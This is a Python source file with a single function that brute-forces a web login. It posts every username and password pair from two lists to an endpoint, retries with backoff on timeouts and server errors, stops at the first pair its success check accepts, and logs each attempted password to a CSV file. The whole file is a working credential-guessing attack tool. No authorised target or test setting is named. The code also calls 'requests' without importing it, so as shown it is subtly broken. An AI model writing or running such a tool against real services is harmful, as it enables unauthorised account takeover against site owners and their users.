import time
import csv
from datetime import datetime
from itertools import product

def brute_force_login(url, usernames, passwords, headers=None, 
                      delay=0.5, timeout=5, max_retries=3, 
                      success_criteria=None, log_file="bruteforce_results.csv"):
    """
    Perform brute-force login attempts.
    
    Parameters:
        url (str): endpoint.
        usernames (list): list of username strings.
        passwords (list): list of password strings.
        headers (dict): optional additional headers.
        delay (float): seconds to wait between attempts.
        timeout (int): request timeout in seconds.
        max_retries (int): retry attempts for failed requests.
        success_criteria (callable): function(response) -> bool; if None, uses default (status 200 and json 'success').
        log_file (str): path to CSV output.
    
    Returns:
        dict: {'success': (user, pass), 'attempts': int, 'total': int}
    """
    if headers is None:
        headers = {"Content-Type": "application/json", "Accept": "application/json"}
    
    # Default success criteria
    if success_criteria is None:
        def success_criteria(resp):
            try:
                return resp.status_code == 200 and resp.json().get('status') == 'success'
            except:
                return False
    
    results = []
    attempt_count = 0
    total_combinations = len(usernames) * len(passwords)
    start_time = datetime.now()
    
    with open(log_file, 'w', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        writer.writerow(['timestamp', 'username', 'password', 'status_code', 'response_preview', 'success'])
        
        for user, pwd in product(usernames, passwords):
            attempt_count += 1
            payload = {"username": user, "password": pwd}
            success = False
            status_code = None
            resp_text = ""
            
            for retry in range(max_retries):
                try:
                    resp = requests.post(url, json=payload, headers=headers, timeout=timeout)
                    status_code = resp.status_code
                    resp_text = resp.text[:200]  # truncate for log
                    
                    if success_criteria(resp):
                        success = True
                        # Log success and return immediately
                        writer.writerow([datetime.now().isoformat(), user, pwd, status_code, resp_text, True])
                        print(f"[SUCCESS] {user}:{pwd} at attempt {attempt_count}")
                        return {
                            'success': (user, pwd),
                            'attempts': attempt_count,
                            'total': total_combinations,
                            'elapsed': (datetime.now() - start_time).total_seconds()
                        }
                    else:
                        # If status is 4xx or 5xx, break retry loop unless it's a server error (5xx)
                        if 500 <= status_code < 600:
                            time.sleep(2 ** retry)  # exponential backoff
                            continue
                        else:
                            break  # non-retryable client error
                
                except (requests.exceptions.Timeout, requests.exceptions.ConnectionError) as e:
                    print(f"[RETRY {retry+1}] {user}:{pwd} - {e}")
                    time.sleep(2 ** retry)
                    continue
                except Exception as e:
                    print(f"[ERROR] {user}:{pwd} - {e}")
                    break
            
            # Log attempt result (non-success)
            writer.writerow([datetime.now().isoformat(), user, pwd, status_code, resp_text, False])
            
            # Rate limiting
            time.sleep(delay)
            
            # Optional progress indicator every 100 attempts
            if attempt_count % 100 == 0:
                elapsed = (datetime.now() - start_time).total_seconds()
                rate = attempt_count / elapsed if elapsed > 0 else 0
                print(f"[PROGRESS] {attempt_count}/{total_combinations} ({attempt_count/total_combinations*100:.1f}%) - {rate:.1f} req/s")
    
    # If loop completes without success
    return {
        'success': None,
        'attempts': attempt_count,
        'total': total_combinations,
        'elapsed': (datetime.now() - start_time).total_seconds()
    }
